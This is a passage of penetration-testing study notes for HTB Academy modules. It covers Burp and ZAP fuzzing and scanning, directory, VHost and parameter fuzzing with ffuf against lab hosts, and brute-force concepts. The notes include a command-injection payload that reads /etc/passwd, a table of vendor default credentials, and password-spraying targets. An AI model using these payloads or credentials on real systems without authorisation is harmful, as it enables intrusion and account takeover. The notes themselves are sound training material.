- Useful when responses are long — extracts a specific part from each response for comparison

Resource Pool:
- Configure concurrent threads / network resources (mostly for Pro)

Running the Attack

  • Click "Start Attack"
  • Results window shows each payload with Status, Length, and your Grep columns
  • Sort by "200 OK" column or "Status" to find hits
  • Click any result row to view the full request/response

Example output — found /admin:

Payload: admin   Status: 200   Length: 244   200 OK: ✅

→ Manually verify: browse to http://TARGET_IP:PORT/admin/

Other Intruder use cases:
- Brute-force login passwords
- Fuzz PHP parameters
- Password spraying against OWA, SSL VPNs, Citrix, RDS, custom AD auth apps

🔥 ZAP Fuzzer

ZAP Fuzzer is ZAP's equivalent to Burp Intruder — with no speed throttling (free).

Starting a Fuzz

  1. Visit a URL that includes the text you want to fuzz (e.g., http://TARGET/test/)
  2. Find the request in Proxy History
  3. Right-click → "Attack > Fuzz"
  4. Fuzzer window opens

Step 1 — Fuzz Locations

  • Select the word you want to fuzz in the request (e.g., highlight test)
  • Click "Add" on the right pane
  • A green marker is placed at that position
  • Payloads window opens automatically

Step 2 — Payloads

Click "Add" → select payload type:

Type Description
File Load a custom wordlist file
File Fuzzers Use ZAP's built-in wordlist databases
Numberzz Generate numeric sequences
Regex Generate strings matching a regex
Script Run a custom script for each payload

Using built-in wordlists:
- Select type: "File Fuzzers"
- Expand dirbuster → select directory-list-1.0.txt
- Click "Add"

💡 More wordlists available via ZAP Marketplace add-ons (FuzzDB Files, FuzzDB Offensive)

Step 3 — Processors

Click "Processors" → "Add" → choose a processing rule:

Processor Use
URL Encode Encode payloads before sending (use this by default)
Base64 Encode/Decode Encode payload as Base64
MD5 Hash Hash each payload
Prefix String Add text before each payload
Postfix String Add text after each payload
Script Custom payload processing script
  • Click "Generate Preview" to see how processed payloads look before sending

Step 4 — Options

  • Concurrent threads per scan: Set to 20 for fast scanning
  • Payload replacement strategy:
  • Depth First — try all payloads on position 1 before position 2 (good for login brute-force: all passwords for one user before moving to next)
  • Breadth First — try each payload across all positions before moving to next (good for credential stuffing: each password tried on all users before next password)

Running the Fuzz

  • Click "Start Fuzzer"
  • Sort results by "Code" column → look for 200 responses
  • Click a result row to see request + response details

Other indicators of success:
| Column | What it tells you |
|---|---|
| Code | HTTP status code (200 = found) |
| Size Resp. Body | Different size = different page content |
| RTT | Round-trip time — high RTT may indicate time-based SQLi |

🔬 Burp Scanner (Pro Only)

Burp Scanner automates vulnerability discovery. It uses two main components:
- Crawler — maps the website structure
- Scanner — finds vulnerabilities passively and actively

⚠️ Burp Scanner is Pro-only — not available in the free Community version.

Setting Target Scope

Why define scope? Limits scanning to your target only — saves resources, prevents accidental out-of-scope testing.

  1. Target > Site map → right-click target → "Add to scope"
  2. Burp will ask if you want to restrict all features to in-scope items only → say Yes
  3. To exclude: right-click in-scope item → "Remove from scope"
  4. View/edit scope: Target > Scope

Use regex patterns in scope for advanced matching (e.g., all subdomains of a target).

Starting a Scan — Options

Method How
From Proxy History Right-click request → Scan / Passive Scan / Active Scan
New Scan (Dashboard) Click "New Scan" → configure custom targets
Scope-based Scan all in-scope items

Crawler

The Crawler maps the website by following all links it finds — similar to ZAP Spider.

⚠️ Crawler does NOT fuzz for unknown pages (like dirbuster does). It only follows links visible in pages. Use Intruder or Content Discovery to find unlisted pages.

Starting a Crawl:
1. Dashboard > New Scan → select "Crawl" (or "Crawl and Audit")
2. Target URL auto-populated from scope
3. Go to Scan Configuration → click "Select from library"

Crawl presets:
- Crawl limit - 10/30/60 minutes — time-boxed crawls
- Crawl strategy - faster / fastest — speed vs coverage
- Crawl strategy - most complete — maximum coverage
- Never stop crawl due to application errors

  1. Application login tab: Add credentials for authenticated scanning
    - Can record login steps manually in pre-configured browser
  2. Click OK → watch progress in Dashboard > Tasks
  3. When complete: Target > Site map shows full structure

Passive Scanner

Analyzes already-visited pages — no new requests sent. Looks for:
- Missing security headers
- DOM-based XSS
- Information disclosure
- Cookie issues

Run passive scan:
- Right-click target in Site map → "Passively scan this target"
- Or right-click request in Proxy History → "Do passive scan"

Viewing results:
- Dashboard > Issue activity pane
- Or: Click scan task → "View Details" → "Issue activity" tab

Confidence levels:
- Certain — definitively confirmed
- Firm — strong evidence
- Tentative — possible but unconfirmed

Focus on High severity + Certain/Firm confidence first.

Active Scanner

The most powerful scan — sends real test payloads to the target.

Steps performed:
1. Runs Crawler + fuzzer to find all pages
2. Runs Passive Scan on all found pages
3. Verifies passive scan findings by sending test requests
4. Performs JavaScript analysis for client-side vulnerabilities
5. Fuzzes parameters for XSS, SQLi, Command Injection, etc.

Starting active scan:
- Right-click request in Proxy History → "Do active scan"
- Or Dashboard > New Scan → select "Crawl and Audit"

Audit configuration presets (select via library):
- Audit checks - critical issues only ← use when you want High severity results fast
- Audit checks - all issues ← comprehensive but slower
- Audit checks - light ← minimal impact on server

Monitor progress:
- Dashboard > Tasks → click task's "View Details" → Logger tab
- Or Logger tab in Burp → shows all requests made by scanner

Filtering results:
- Dashboard > Issue activity → filter by High + Certain

Reporting

Target > Site map → right-click target → Issue > Report issues for this host
- Export format: HTML, XML
- Includes: vulnerability description, severity, proof-of-concept, remediation advice

⚠️ Never submit a raw tool-generated report as a final pentest deliverable. Use it as supplementary appendix data in your custom report.

🔬 ZAP Scanner (Free)

ZAP Scanner is free and fully-featured — no paid tier needed.

Spider (like Burp Crawler)

Maps the website by following all discovered links.

Start via Proxy History:
1. Right-click request → Attack > Spider

Start via HUD:
- Click 2nd button on right pane → "Spider Start"
- ZAP may ask to add site to scope → click Yes

Monitor:
- Progress shown on Spider button in HUD
- ZAP main UI auto-switches to Spider tab

Results:
- Click 1st button on right pane → "Sites Tree"
- Shows all discovered URLs in a tree structure

💡 Ajax Spider (3rd button on right pane): Also captures URLs loaded via JavaScript AJAX — run this after normal Spider for more complete coverage. Takes slightly longer.

Passive Scanner

Runs automatically while Spider is active — no manual trigger needed. Analyzes each response for:
- Missing headers
- DOM-based XSS
- Cookie issues
- Information disclosure

View alerts:
- HUD left pane: Current page alerts
- HUD right pane: Overall site alerts
- ZAP main UI: Alerts tab

Active Scanner

Tests all discovered pages with active payloads.

Start via HUD:
- Click "Active Scan" button on right pane (4th button)
- If Spider hasn't run yet, ZAP auto-runs it first

Monitor: Progress shown on Active Scan button in HUD + ZAP main UI

Results:
- HUD right pane → click alert count to see categorized alerts
- Click any alert for full details: description, risk level, confidence, attack payload, evidence

Example ZAP finding:

Alert:    Remote OS Command Injection
Risk:     High
Confidence: Medium
Attack:   127.0.0.1&cat /etc/passwd&
Evidence: root:x:0:0

ZAP Reporting

Report > Generate HTML Report (or XML, Markdown)

Report includes:
- Risk Level summary table (High/Medium/Low/Informational)
- All alerts with: Name, Risk, Number of instances
- Alert details on click

🧠 Key Concepts Summary

Browser → FoxyProxy → Burp/ZAP Proxy (127.0.0.1:8080) → Internet/Target Server
                            ↓
                    Intercept / Modify / Forward
                            ↓
                    Repeat / Fuzz / Scan

Decision Flow

Need to test a single request?
    → Intercept & Modify (Proxy)
    → Repeat with changes (Repeater / Request Editor)

Need to automate testing of many values?
    → Fuzz (Burp Intruder / ZAP Fuzzer)

Need to discover vulnerabilities across the whole app?
    → Scan (Burp Scanner Pro / ZAP Active Scanner)

Need to route a CLI tool through the proxy?
    → proxychains <command>
    → or set --proxies flag in tool

Quick Wins During Pentests

  1. Check response cookies → decode Base64 → look for is_admin:false → flip it
  2. Force-refresh to get response interception → CTRL+SHIFT+R in Firefox
  3. Find hidden/disabled fields → ZAP HUD light bulb button → instantly enabled
  4. Check HTML comments → ZAP HUD → Add Comments button → hover indicators
  5. All cli tool traffic through proxy → proxychains <tool> → analyze in Burp

📝 Note: This module focuses on how to USE web proxies — specific attack techniques (SQLi, XSS, Command Injection) are covered in dedicated HTB Academy modules. The proxy is the delivery vehicle for those attacks.

Web Applications/Module 15

Attacking Web Applications with Ffuf

🔍 What is Web Fuzzing?

Fuzzing is an automated testing technique where you send a large number of inputs to a target interface to observe how it responds. In web security, this means bombarding a server with potential directory names, file names, parameters, and values to discover hidden or undocumented endpoints.

Why do we fuzz?

Web servers do not publish a directory listing of all their pages (unless severely misconfigured). So we have no way to know what pages or directories exist without checking manually — which is humanly impossible at scale.

The logic is simple:
- Send a request → get 404 Not Found → page does not exist
- Send a request → get 200 OK → page exists, investigate further
- Send a request → get 301/302 → page redirects somewhere, still interesting
- Send a request → get 403 Forbidden → page exists but you can't access it yet

Use cases covered in this module

Fuzzing Type What We're Looking For
Directory Fuzzing Hidden folders on the server
Extension Fuzzing What file types the server uses (.php, .html, etc.)
Page Fuzzing Hidden files within a directory
Recursive Fuzzing Automate all of the above in one pass
Sub-domain Fuzzing Public sub-domains of a target domain
VHost Fuzzing Non-public virtual hosts on the same IP
Parameter Fuzzing (GET/POST) Hidden or undocumented parameters
Value Fuzzing Valid values for a discovered parameter

📚 Wordlists

Wordlists are pre-built lists of commonly used words for each fuzzing type. You don't need to build these from scratch — the SecLists GitHub repository has them categorised by purpose.

  • GitHub Repo: https://github.com/danielmiessler/SecLists
  • Local path on PwnBox/Kali: /opt/useful/seclists/ or /usr/share/seclists/

Wordlists used in this module

Purpose Path
Directory & Page Fuzzing /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
Extension Fuzzing /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
Sub-domain / Domain Fuzzing /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Parameter Name Fuzzing /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt

💡 Tip: The directory-list-2.3-small.txt wordlist contains copyright comments at the top. These would be sent as requests and clutter results. Use the -ic flag in ffuf to ignore comment lines.

🛠️ Tool — ffuf

ffuf (Fuzz Faster U Fool) is a fast, flexible web fuzzer written in Go. It works by placing the keyword FUZZ anywhere in a URL, header, or POST body, and replacing it with each word from a wordlist.

Installation

# On Debian/Ubuntu
apt install ffuf -y

# Or from source
# https://github.com/ffuf/ffuf

ffuf is pre-installed on HTB PwnBox instances.

Core Flags Reference

ffuf -h
Flag Purpose
-w <wordlist>:FUZZ Specify wordlist and assign it to the keyword FUZZ
-u <url> Target URL (put FUZZ where you want to inject)
-H "Header: Value" Add a custom HTTP header
-X POST Change HTTP method (default is GET)
-d 'data' POST body data
-b "COOKIE=val" Send cookies
-recursion Enable recursive scanning into found directories
-recursion-depth 1 Limit recursion to N levels deep
-e .php Append file extension during recursive scan
-v Verbose output — shows full URLs
-ic Ignore comment lines in wordlists
-t 200 Number of threads (default: 40, max recommended: 200 — use carefully)
-o output.txt Save results to a file
-mc 200,301 Match only specific HTTP status codes
-ms <size> Match by response size
-ml <lines> Match by number of lines in response
-mw <words> Match by word count
-fc 404 Filter out specific HTTP codes
-fs <size> Filter out responses of a specific size
-fl <lines> Filter out by line count
-fw <words> Filter out by word count
-fr <regex> Filter by regex pattern

⚠️ Thread Warning: Using -t 200 or higher can overwhelm the target server, cause Denial of Service, or crash your internet connection. Use high thread counts only on local lab targets.

📁 Directory Fuzzing

Goal

Find hidden directories on the web server by brute-forcing directory names.

How it works

The FUZZ keyword is placed at the end of the URL path. ffuf replaces it with each word from the wordlist and checks what HTTP response code comes back.

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://SERVER_IP:PORT/FUZZ

Breaking it down:
- -w .../directory-list-2.3-small.txt:FUZZ — loads the wordlist and labels it FUZZ
- -u http://SERVER_IP:PORT/FUZZ — the FUZZ in the URL is replaced with each word

What to look for in results

blog    [Status: 301, Size: 326, Words: 20, Lines: 10]
  • Status: 301 — directory exists and redirects (usually to directory/)
  • Status: 200 — directory or file exists and responds directly
  • Status: 403 — exists but access is denied — still note it!

What to do next

Once you find directories like /blog, drill into them. A 301 redirect to an empty-looking page doesn't mean it's empty — it may have hidden files inside. Move on to Extension Fuzzing and Page Fuzzing.

ffuf can test ~90,000 URLs in under 10 seconds by default with 40 threads.

🔎 Extension Fuzzing

Goal

Determine what file types (extensions) the server uses — .php, .html, .aspx, etc. — so you know what to look for when fuzzing for pages.

How it works

We fuzz the extension position of a known file. Nearly every web server has an index file, so we use index as the base and fuzz what comes after it.

💡 The web-extensions.txt wordlist already includes the dot (.) before each extension, so you write indexFUZZ, not index.FUZZ.

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u http://SERVER_IP:PORT/blog/indexFUZZ

Breaking it down:
- We already found /blog from directory fuzzing
- indexFUZZ → tries index.php, index.html, index.aspx, etc.

What to look for

.php     [Status: 200, Size: 0, Words: 1, Lines: 1]
.phps    [Status: 403, Size: 283, Words: 20, Lines: 10]
  • .php returns 200 → the server runs PHP
  • .phps returns 403 → exists but forbidden

What to do next

Now that you know the server uses .php, use that extension in your Page Fuzzing step.

📄 Page Fuzzing

Goal

Find hidden PHP (or whatever extension you discovered) files inside a directory.

How it works

Place FUZZ where the filename would be and append the known extension. ffuf tries every word in the wordlist as a filename.

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://SERVER_IP:PORT/blog/FUZZ.php

Breaking it down:
- We know the directory is /blog (from directory fuzzing)
- We know the extension is .php (from extension fuzzing)
- FUZZ.php → tries admin.php, login.php, index.php, etc.

What to look for

index      [Status: 200, Size: 0, Words: 1, Lines: 1]
home       [Status: 200, Size: 465, Words: 42, Lines: 15]
  • index → size 0, empty page
  • home → has content, worth visiting manually

What to do next

Visit the pages you find. If one says something like "Admin panel moved to admin.academy.htb", that's a clue to start VHost Fuzzing.

🔁 Recursive Fuzzing

Goal

Automate the full process of directory + page fuzzing in one command, so you don't have to run multiple scans manually for each directory you find.

How it works

When ffuf finds a directory, it automatically queues a new scan inside that directory. This continues until it hits the recursion depth limit you specify.

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://SERVER_IP:PORT/FUZZ \
     -recursion \
     -recursion-depth 1 \
     -e .php \
     -v

Breaking it down:
- -recursion — enables recursive mode
- -recursion-depth 1 — only goes one level deep (scans /blog/ but NOT /blog/sub/). This prevents infinite scans on deeply nested sites.
- -e .php — in recursive mode, also try each word with .php appended
- -v — verbose, shows full URL for each result so you can tell which directory each file is in

What to look for

[Status: 301] | URL | http://SERVER_IP:PORT/blog --> http://SERVER_IP:PORT/blog/
[INFO] Adding a new job to the queue: http://SERVER_IP:PORT/blog/FUZZ
[Status: 200] | URL | http://SERVER_IP:PORT/blog/index.php

The [INFO] lines tell you ffuf is automatically queuing child scans. You'll see all results from both the root and sub-directories in one run.

What to do next

After the recursive scan, note all found directories and PHP files. If a page gives you a clue (like mentioning another domain/hostname), pivot to sub-domain or VHost fuzzing.

⚠️ Recursive scans take longer and send many more requests (roughly 6x more with -e .php). Be mindful on real targets.

🌐 DNS Records & /etc/hosts

Why this matters

When a discovered page redirects you to academy.htb or admin.academy.htb, your browser can't resolve it unless either:
1. It has a public DNS record, OR
2. You add it manually to /etc/hosts

HTB lab targets are local/private, not publicly registered — so you must add them manually.

Adding a host entry

sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'

Breaking it down:
- sudo sh -c '...' — runs the command as root (needed to write to /etc/hosts)
- echo "SERVER_IP academy.htb" — maps the IP to the hostname
- >> /etc/hosts — appends to the file (does not overwrite)

Replace SERVER_IP with the actual IP of your target.

💡 After adding, you can visit http://academy.htb:PORT in your browser. If it shows the same page as the IP, the mapping worked.

🔗 Sub-domain Fuzzing

Goal

Find publicly registered sub-domains of a target domain (e.g., photos.google.com is a sub-domain of google.com).

How it works

Place FUZZ in the sub-domain position of the URL. ffuf tries each word from the wordlist and checks if a valid DNS record exists for it.

Command

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u https://FUZZ.inlanefreight.com/

Breaking it down:
- FUZZ.inlanefreight.com → tries admin.inlanefreight.com, dev.inlanefreight.com, etc.
- ffuf checks if each sub-domain resolves and returns a valid HTTP response

What to look for

support    [Status: 301, Duration: 381ms]
blog       [Status: 301, Duration: 402ms]
www        [Status: 200, Size: 22266]

Any hit means that sub-domain exists publicly.

Limitation

This method only works for publicly registered DNS records. If a sub-domain like admin.academy.htb has no public DNS record, this method returns nothing — even if the sub-domain is real and running on the server.

That's when you switch to VHost Fuzzing.

🏠 VHost Fuzzing

Goal

Find virtual hosts (VHosts) — multiple websites served from the same IP address — including ones with no public DNS record.

VHosts vs Sub-domains

Sub-domain Fuzzing VHost Fuzzing
Requires public DNS? ✅ Yes ❌ No
Method DNS resolution HTTP Host header manipulation
Finds private hosts? ❌ No ✅ Yes

How it works

Instead of relying on DNS, we send HTTP requests directly to the server IP and manipulate the Host: header. The server uses this header to decide which virtual host to serve. By fuzzing this header, we can discover hidden VHosts.

Command

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://academy.htb:PORT/ \
     -H 'Host: FUZZ.academy.htb'

Breaking it down:
- -u http://academy.htb:PORT/ — we always hit the same IP/URL
- -H 'Host: FUZZ.academy.htb' — but we change the Host header each time
- The server sees different hostnames and potentially serves different content

Problem: Too many false positives

When no VHost matches, the server still returns a response (usually the default site) with a consistent size. This means every single word gets a 200 OK with the same size — all false positives.

mail2    [Status: 200, Size: 900]
ns3      [Status: 200, Size: 900]
lists    [Status: 200, Size: 900]
... (everything returns size 900)

Solution: Filter by size with -fs

Since all false positives share the same response size (e.g., 900), filter them out:

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://academy.htb:PORT/ \
     -H 'Host: FUZZ.academy.htb' \
     -fs 900

Now only responses with a different size pass through — those are your real VHosts.

What to look for

admin    [Status: 200, Size: 0, Words: 1, Lines: 1]

A result with a different size means a real VHost was found.

What to do next

  1. Add the discovered VHost to /etc/hosts:
    bash sudo sh -c 'echo "SERVER_IP admin.academy.htb" >> /etc/hosts'
  2. Visit it in your browser
  3. Run a recursive ffuf scan on it to find its pages

🧹 Filtering Results

ffuf's default matcher accepts HTTP codes: 200, 204, 301, 302, 307, 401, 403. You can tune this.

Matcher Options (what to KEEP)

-mc   Match HTTP status codes (e.g., -mc 200,301)
-ms   Match by response size
-ml   Match by line count
-mw   Match by word count
-mr   Match by regex

Filter Options (what to DISCARD)

-fc   Filter HTTP status codes (e.g., -fc 404)
-fs   Filter by response size (e.g., -fs 900)
-fl   Filter by line count
-fw   Filter by word count
-fr   Filter by regex

Strategy

  • If you know the size of false positive responses → use -fs <size>
  • If only specific status codes are meaningful → use -mc <codes>
  • First run without filters to observe the noise, then add filters on the second run

🔑 Parameter Fuzzing — GET

Goal

Discover hidden or undocumented GET parameters that a page accepts. Some parameters may bypass access controls or reveal sensitive data.

How it works

GET parameters appear in the URL after a ?, like: admin.php?param=value

We place FUZZ where the parameter name goes and send a dummy value (key). When a valid parameter name is found, the response will differ in size.

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key \
     -fs xxx

Breaking it down:
- ?FUZZ=key — tries ?username=key, ?id=key, ?token=key, etc.
- -fs xxx — replace xxx with the size of false positive responses (first run without -fs to find it)
- We're fuzzing for the parameter name, not the value yet

What to look for

user    [Status: 200, Size: 450]

A response with a different size means the server recognised that parameter and did something different with it.

What to do next

If you get a hit but the page says "This method is deprecated" — the parameter exists but isn't the active one. Keep the result and move on to POST parameter fuzzing for the same endpoint.

📬 Parameter Fuzzing — POST

Goal

Discover hidden POST parameters. POST parameters are sent in the request body, not the URL, making them less visible and often less secured.

Key differences from GET

  • POST data is sent with -d 'FUZZ=key'
  • Method must be set with -X POST
  • PHP endpoints require the content type header: Content-Type: application/x-www-form-urlencoded

Command

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u http://admin.academy.htb:PORT/admin/admin.php \
     -X POST \
     -d 'FUZZ=key' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fs xxx

Breaking it down:
- -X POST — sends a POST request instead of GET
- -d 'FUZZ=key' — the POST body, with FUZZ as the parameter name
- -H 'Content-Type: application/x-www-form-urlencoded' — required for PHP to parse POST data correctly
- -fs xxx — filter out the noise (run once first without it to get the baseline size)

What to look for

id    [Status: 200, Size: 768]

A different size response — meaning the server reacted differently to the id parameter.

Verify with curl

Once you find a valid parameter name, test it manually with curl:

curl http://admin.academy.htb:PORT/admin/admin.php \
     -X POST \
     -d 'id=key' \
     -H 'Content-Type: application/x-www-form-urlencoded'

If the response says Invalid id! — the parameter works, but you sent the wrong value. Now you need to fuzz the value.

🎯 Value Fuzzing

Goal

Find the correct value for a discovered parameter (like id) that returns the flag or useful data.

Building a custom wordlist

When no pre-made wordlist fits, create one. For numeric IDs from 1 to 1000:

for i in $(seq 1 1000); do echo $i >> ids.txt; done

Breaking it down:
- seq 1 1000 — generates numbers 1 through 1000
- echo $i >> ids.txt — appends each number to ids.txt
- Result: a file with one number per line, 1–1000

Verify it worked:

cat ids.txt
# 1
# 2
# 3
# ...

Command

ffuf -w ids.txt:FUZZ \
     -u http://admin.academy.htb:PORT/admin/admin.php \
     -X POST \
     -d 'id=FUZZ' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fs xxx

Breaking it down:
- -w ids.txt:FUZZ — use our custom numeric wordlist
- -d 'id=FUZZ' — fuzz the value of the id parameter this time
- -fs xxx — filter the "Invalid id!" responses (same size each time)

What to look for

73    [Status: 200, Size: 1234]

A response with a different size — that ID returned something different (probably the flag).

Retrieve the flag with curl

curl http://admin.academy.htb:PORT/admin/admin.php \
     -X POST \
     -d 'id=73' \
     -H 'Content-Type: application/x-www-form-urlencoded'

🏁 Skills Assessment Workflow

For the assessment, you start with just an IP and must enumerate everything. Here's the full attack chain:

1. Directory Fuzzing
   └─ Find top-level directories (e.g., /blog, /admin, /forum)

2. Extension Fuzzing
   └─ Determine server-side language (.php, .aspx, etc.)

3. Page Fuzzing
   └─ Find files within each directory

4. Recursive Fuzzing (optional, consolidates steps 1-3)
   └─ Run once with -recursion -recursion-depth 1 -e .php

5. Check page content for clues
   └─ Look for hostnames, redirects, hints about other domains

6. VHost Fuzzing
   └─ Discover hidden virtual hosts on the same IP

7. Add discovered VHosts to /etc/hosts

8. Recursive scan on new VHosts
   └─ Find pages on admin.academy.htb, etc.

9. Parameter Fuzzing (GET then POST)
   └─ Find hidden parameters on interesting pages

10. Value Fuzzing
    └─ Brute-force valid values for found parameters

📋 Cheat Sheet — Quick Reference

ffuf Commands

Command Purpose
ffuf -h Show help
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ Directory Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ Extension Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php Page Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v Recursive Fuzzing
ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/ Sub-domain Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx VHost Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx GET Parameter Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx POST Parameter Fuzzing
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx Value Fuzzing

Wordlist Locations

Purpose Path
Directory/Page Wordlist /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
Extensions Wordlist /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
Domain/Sub-domain Wordlist /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Parameters Wordlist /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt

Misc Commands

Command Purpose
sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts' Add DNS entry to hosts file
for i in $(seq 1 1000); do echo $i >> ids.txt; done Create numeric wordlist (1–1000)
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' Manual POST request with curl

🔗 External References

  • ffuf GitHub: https://github.com/ffuf/ffuf
  • SecLists GitHub: https://github.com/danielmiessler/SecLists
  • HTB Academy — Web Requests module (referenced for POST/GET concepts): https://academy.hackthebox.com
  • HTB Academy — ffuf module: https://academy.hackthebox.com/module/details/54

🧠 Key Takeaways

  • Always start with directory fuzzing, then drill into found directories with extension and page fuzzing
  • Use recursive fuzzing to save time when you want a complete picture fast
  • Sub-domain fuzzing only finds public DNS records — for private ones, use VHost fuzzing
  • In VHost fuzzing, always use -fs to filter out the default server response size
  • When fuzzing parameters, first fuzz the name, then fuzz the value
  • Build custom wordlists (like sequential IDs) when no pre-made list fits
  • Use curl to manually verify and interact with findings after fuzzing

Notes created for HTB CPTS Exam Preparation — Module 15

Web Applications/Module 16

Login Brute Forcing

What is Brute Forcing?

Brute forcing in cybersecurity is a trial-and-error method used to crack passwords, login credentials, or encryption keys. The attacker systematically tries every possible combination of characters until the correct one is found — like a thief trying every key on a giant keyring.

Factors That Determine Success

Factor Impact
Password Complexity Longer passwords with mixed character types are exponentially harder to crack
Computational Power Modern hardware can try billions of combinations per second
Security Measures Account lockouts, CAPTCHAs, and rate limiting can slow or stop attacks

How Brute Forcing Works

Start → Generate Combination → Apply Combination → Check if Successful
                  ↑                                        |
                  |←←←←←←← No (loop back) ←←←←←←←←←←←←←|
                                                           |
                                              Yes → Access Granted → End
  1. Start — Attacker initiates the process, usually with specialized software
  2. Generate Possible Combination — Software generates a candidate password based on character sets and length rules
  3. Apply Combination — The candidate is tried against the target (login form, SSH, encrypted file, etc.)
  4. Check if Successful — If it matches, access is granted. If not, the loop continues.
  5. Access Granted — Attacker gains unauthorized access
  6. End — Process repeats until the correct combo is found or attacker gives up

Types of Brute Forcing

Attack Type Description Best Used When
Simple Brute Force Tries every possible character combination systematically No prior info about the password; resources are abundant
Dictionary Attack Uses a pre-compiled list of common words/passwords Target likely uses a weak or common password
Hybrid Attack Combines dictionary + brute force (appends numbers/symbols to dict words) Target uses a slightly modified common password (e.g., Summer2023!)
Credential Stuffing Uses leaked credentials from one breach to access other services Large set of leaked creds available; target suspected of password reuse
Password Spraying Tries a few common passwords across many usernames Account lockout policies are in place; attacker wants to avoid detection
Rainbow Table Attack Uses precomputed hash tables to reverse password hashes Large number of hashes need cracking; storage space is available
Reverse Brute Force Targets a single known password against many usernames Strong suspicion that one password is reused across multiple accounts
Distributed Brute Force Spreads the attack across multiple machines Password is highly complex; single machine lacks the power needed

Password Security Fundamentals

What Makes a Strong Password (NIST Guidelines)

Property Explanation
Length Minimum 12 characters. Each extra character multiplies possible combos exponentially
Complexity Mix uppercase, lowercase, numbers, and symbols. More character types = bigger search space
Uniqueness Never reuse passwords. A breach on one site shouldn't compromise others
Randomness Avoid dictionary words, personal info, or common phrases

Example of why length matters:
- 6-char lowercase: 26^6 ≈ 308 million combinations
- 8-char lowercase: 26^8 ≈ 200 billion combinations
- 8-char mixed case: 52^8 ≈ 53 trillion combinations
- 12-char full ASCII: 94^12 ≈ 475 quintillion combinations

Common Password Weaknesses (What Attackers Target)

  • Short passwords (< 8 characters) — small search space, easy to crack
  • Dictionary words or phrases — vulnerable to dictionary attacks
  • Personal information — birthdays, names, pet names found on social media
  • Password reuse — one breach = all accounts compromised
  • Predictable patterns — qwerty, 123456, p@ssw0rd — well-known to attackers

Password Policies (and Their Pitfalls)

Organizations enforce policies requiring:
- Minimum length
- Complexity (uppercase, numbers, symbols)
- Expiration (periodic forced changes)
- History (can't reuse recent passwords)

⚠️ Pitfall: Forced changes often lead users to make predictable minor modifications like Summer2023 → Summer2023! → Summer2024. This is exactly what hybrid attacks exploit.

Default Credentials

⚠️ Critical Attack Surface: Many devices ship with well-known default credentials. Attackers compile lists and automate testing — sometimes without even brute-forcing.

Common Default Credentials Table

Device Default Username Default Password
Linksys Router admin admin
D-Link Router admin admin
Netgear Router admin password
TP-Link Router admin admin
Cisco Router cisco cisco
Asus Router admin admin
Belkin Router admin password
Zyxel Router admin 1234
Samsung SmartCam admin 4321
Hikvision DVR admin 12345
Axis IP Camera root pass
Ubiquiti UniFi AP ubnt ubnt
Canon Printer admin admin
Honeywell Thermostat admin 1234
Panasonic DVR admin 12345

Key insight: Even when the password is changed, keeping the default username still cuts the attacker's work in half — they only need to crack the password.

Useful resource: SecLists maintains a list of common usernames:
🔗 top-usernames-shortlist.txt — https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt

Default credentials list:
🔗 https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt

The Math Behind Brute Force

Formula

Possible Combinations = Character Set Size ^ Password Length

Search Space Comparison Table

Scenario Length Character Set Combinations
Short and Simple 6 Lowercase (a-z) 26^6 = ~308 million
Longer but Simple 8 Lowercase (a-z) 26^8 = ~208 billion
Adding Complexity 8 Upper + Lower (a-z, A-Z) 52^8 = ~53 trillion
Maximum Complexity 12 All ASCII (94 chars) 94^12 = ~476 quintillion

Cracking Speed Reality Check

Machine Speed 8-char alphanumeric 12-char full ASCII
Basic Computer 1M passwords/sec ~6.92 years Impractical
Supercomputer 1T passwords/sec ~3.64 minutes ~15,000 years

